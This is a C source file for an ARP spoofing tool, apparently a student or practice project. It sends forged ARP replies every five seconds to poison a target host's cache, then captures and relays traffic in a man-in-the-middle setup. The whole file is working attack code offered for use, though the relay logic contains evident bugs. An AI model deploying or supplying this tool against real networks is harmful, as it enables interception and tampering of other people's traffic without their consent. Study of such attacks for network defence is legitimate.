#include<stdio.h>
#include<pcap.h>
#include<arpa/inet.h>
#include<libnet.h>
#include<string.h>
#include<stdlib.h>
#include<stdint.h>
#include<sys/socket.h>
#include<pthread.h>

#define AF_LINK AF_PACKET
#define SIZE_OF_ETHERNET 14
#define SIZE_OF_IPV4 20
#define SIZE_OF_TCP 20
#define SIZE_OF_ARP 8
#define PACKET_SIZE 42

struct ip_address{ 
	u_char ar_sha[6];
	u_char ar_spa[4];
	u_char ar_tha[6];
	u_char ar_tpa[4];
};

struct thread_argument{
	char*sender_mac;
	char*sender_ip;
	char*target_mac;
	char*target_ip;
};

pcap_t* handle;

struct target{
	char sender_mac[6];
	char sender_ip[20];
	char target_mac[6];
	char target_ip[20];
}target;

char myip[20],mymac[6];

void usage()
{
	printf("usage  : sudo ./arp_spoof <interface> <sender ip> <target ip>\n");
	printf("sample : sudo ./arp_spoof eth0 192.168.0.2 192.168.0.1\n");
}

void print_mac(uint8_t*mac)
{
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void find_target_mac(char*dev,char*my_ip, char*my_mac, char*target_ip, char*target_mac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	printf("[+]Finding Target Mac\n");
	
	struct libnet_ethernet_hdr*ethhdr=0;
	struct libnet_arp_hdr*arphdr=0;
	struct ip_address*ipaddr=0;
	u_char packet[PACKET_SIZE+1]={};
	const u_char* packet_reply=0;
	
	ethhdr = (struct libnet_ethernet_hdr*)packet;
	memset(ethhdr->ether_dhost,'\xff',6);
	memcpy(ethhdr->ether_shost,my_mac,6);
	ethhdr->ether_type = htons(ETHERTYPE_ARP);

	arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
	arphdr->ar_hrd = htons(ARPHRD_ETHER);
	arphdr->ar_pro = htons(ETHERTYPE_IP);
	arphdr->ar_hln = 6;
	arphdr->ar_pln = 4;
	arphdr->ar_op  = htons(ARPOP_REQUEST);

	ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
	memcpy(ipaddr->ar_sha,my_mac,6);
	inet_pton(AF_INET, my_ip, &ipaddr->ar_spa);
	memcpy(ipaddr->ar_tha,target_mac,6);
	inet_pton(AF_INET, target_ip, &ipaddr->ar_tpa);

	if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
	{
		printf("[-]Failed to send packet\n");
		exit(1);
	}

	while(true)
	{
		struct pcap_pkthdr header;
		packet_reply = pcap_next(handle,&header);
		if(packet_reply == NULL)
		{
			printf("[-]Failed to get next packet\n");
			exit(1);
		}
		
		ethhdr = (struct libnet_ethernet_hdr*)packet_reply;
		arphdr = (struct libnet_arp_hdr*)(packet_reply+SIZE_OF_ETHERNET);
		ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
		if(ethhdr->ether_type == htons(ETHERTYPE_ARP)
				&& arphdr->ar_op == htons(ARPOP_REPLY))break;
	}

	printf("[+]Success to find Target Mac\n");
	printf("[*]Target Mac  : ");
	print_mac(ipaddr->ar_sha);
	memcpy(target_mac, ipaddr->ar_sha, 6);
}

void *fake_arp_reply(void*argv)
{
	struct thread_argument *tharg = (struct thread_argument*)argv;

	struct libnet_ethernet_hdr*ethhdr=0;
	struct libnet_arp_hdr*arphdr=0;
	struct ip_address*ipaddr=0;
	u_char packet[PACKET_SIZE+1]={};

	ethhdr = (struct libnet_ethernet_hdr*)packet;
	memcpy(ethhdr->ether_dhost,tharg->target_mac,6);
	memcpy(ethhdr->ether_shost,tharg->sender_mac,6);
	ethhdr->ether_type = htons(ETHERTYPE_ARP);
	
	arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
	arphdr->ar_hrd = htons(ARPHRD_ETHER);
	arphdr->ar_pro = htons(ETHERTYPE_IP);
	arphdr->ar_hln = 6;
	arphdr->ar_pln = 4;
	arphdr->ar_op  = htons(ARPOP_REPLY);

	ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
	memcpy(ipaddr->ar_sha,tharg->sender_mac,6);
	inet_pton(AF_INET, tharg->sender_ip, &ipaddr->ar_spa);
	memcpy(ipaddr->ar_tha,tharg->target_mac,6);
	inet_pton(AF_INET, tharg->target_ip, &ipaddr->ar_tpa);
	 
	while(true)
	{
		if(pcap_sendpacket(handle, packet, PACKET_SIZE)==-1)
		{
			printf("[-]Failed to send packet to %s\n",tharg->target_ip);
			exit(1);
		}
		printf("[+]Success to send Fake ARP Reply to %s\n",tharg->target_ip);
		sleep(5);
	}
	return 0;
}

void receive_and_relay(u_char*usr,const struct pcap_pkthdr *header,const u_char*packet)
{
	printf("[+]Receiving Spoofed IP Packet\n");

	struct libnet_ethernet_hdr*ethhdr=0;
	struct libnet_arp_hdr*arphdr=0;
	struct libnet_ipv4_hdr*iphdr=0;
	struct libnet_tcp_hdr*tcphdr=0;
	struct ip_address*ipaddr=0;

	ethhdr = (struct libnet_ethernet_hdr*)packet;
	if(ntohs(ethhdr->ether_type)==ETHERTYPE_ARP)
	{
		arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
		ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
		
		char target_ip_net[4];
		char sender_ip_net[4];
		
		inet_pton(AF_INET, target.target_ip, &target_ip_net);
		inet_pton(AF_INET, target.sender_ip, &sender_ip_net);
		if(memcmp(ipaddr->ar_sha,target_ip_net,4)==0 && 
				memcmp(ipaddr->ar_tha,sender_ip_net,4)==0)
		{
			printf("[*]Relaying IP Packet");
			memcpy(ethhdr->ether_shost,mymac,6);
		}

		if(pcap_sendpacket(handle,packet,header->len)==-1)
		{
			printf("[-]Failed to send packet\n");
		}
	}
	/*
	ethhdr = (struct libnet_ethernet_hdr*)packet;
	printf("[*]----------------------------\n");
	printf("[*]SRC MAC : ");
	print_mac(ethhdr->ether_shost);
	printf("[*]DST MAC : ");
	print_mac(ethhdr->ether_dhost);
	printf("[*]ETHERTYPE = 0x%04X", ntohs(ethhdr->ether_type));
	
	if(ntohs(ethhdr->ether_type)!=ETHERTYPE_IP)
	{
		printf("\n[-]Ether type is not IP\n");
		return;
	}
	iphdr = (struct libnet_ipv4_hdr*)(packet + SIZE_OF_ETHERNET);
	printf("\n[*]SRC IP : %s", inet_ntoa(iphdr->ip_src));
	printf("\n[*]DST IP : %s", inet_ntoa(iphdr->ip_dst));
	printf("\n[*]IP_P   : %d", iphdr->ip_p);
	
	if(iphdr->ip_p!=0x06)
	{
		printf("\n[-]IP Protocol is not TCP\n");
		return;
	}
	tcphdr = (struct libnet_tcp_hdr*)(iphdr + SIZE_OF_IPV4);
	printf("\n[*]SRC PORT : %d",ntohs(tcphdr->th_sport));
	printf("\n[*]DST PORT : %d",ntohs(tcphdr->th_dport));
	
	char*data = (char*)(tcphdr + SIZE_OF_TCP);
	int bytes = header->len - SIZE_OF_ETHERNET - SIZE_OF_IPV4 - SIZE_OF_TCP;
	bytes = 16<bytes?16:bytes;
	for(int i=0;i<bytes;i++)printf("%X",data[i]);*/
	printf("[+]%u bytes captured\n\n",header->len);
}


int main(int argc, char **argv)
{
	if(argc != 4)
	{
		usage();
		return -1;
	}
	printf("[+]ARP_SPOOF\n");
	char dev[8],errbuf[PCAP_ERRBUF_SIZE];
	uint32_t mask, net;
	struct in_addr addr;

	strncpy(dev,argv[1],8);
	if(dev == NULL)
	{
		printf("[-]Failed to find network device.\n");
		return -1;
	}

	printf("[*]Device Name : %s\n",dev);
	
	strncpy(target.sender_ip,argv[2],18);
	strncpy(target.target_ip,argv[3],18);

	pcap_if_t *alldev;
	bool mac_ok=false,ip_ok=false;
	if(pcap_findalldevs(&alldev, errbuf)!=0)
	{
	  printf("[-]Failed to find network devices.\n");
	  return -1;
	}
	for(pcap_if_t *i=alldev; i != NULL ; i=i->next)
	{
		if(strcmp(i->name,dev))continue;
		for(pcap_addr_t *j=i->addresses; j != NULL ; j=j->next)
		{
			
			if(j->addr->sa_family == AF_INET)
			{
				strncpy(myip, inet_ntoa(((struct sockaddr_in*)j->addr)->sin_addr),18);
				ip_ok = true;
			}
			if(j->addr->sa_family == AF_LINK)
			{
				char* macaddr = (char*)j->addr->sa_data;
				macaddr+=10;
				memcpy((void*)mymac,(void*)(macaddr),6);
				mac_ok = true;
			}
			if(mac_ok&&ip_ok)break;
		}
		break;
	}
	pcap_freealldevs(alldev);
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
	  printf("[-]Couldn't open device %s: %s\n",dev,errbuf);
	  return 1;
	}

	printf("[*]My IP       : %s\n",myip);
	printf("[*]My Mac      : ");
	print_mac((uint8_t*)mymac);
	printf("[*]Sender IP   : %s\n",target.sender_ip);
	printf("[*]Target IP   : %s\n",target.target_ip);
	puts("");

	find_target_mac(dev,myip,mymac,target.target_ip,target.target_mac);
	puts("");

	pthread_t thread;
	struct thread_argument th_arg;
	th_arg.sender_ip = target.sender_ip;
	th_arg.sender_mac = mymac;
	th_arg.target_ip = target.target_ip;
	th_arg.target_mac = target.target_mac;

	pthread_create(&thread, NULL, &fake_arp_reply, (void *)&th_arg);
	
	int cnt;
	if(pcap_loop(handle,-1,receive_and_relay,(u_char*)&cnt)==-1)
	{
		printf("[-]Can't find next packet\n");
		return 1;
	}
	
	return 0;
}
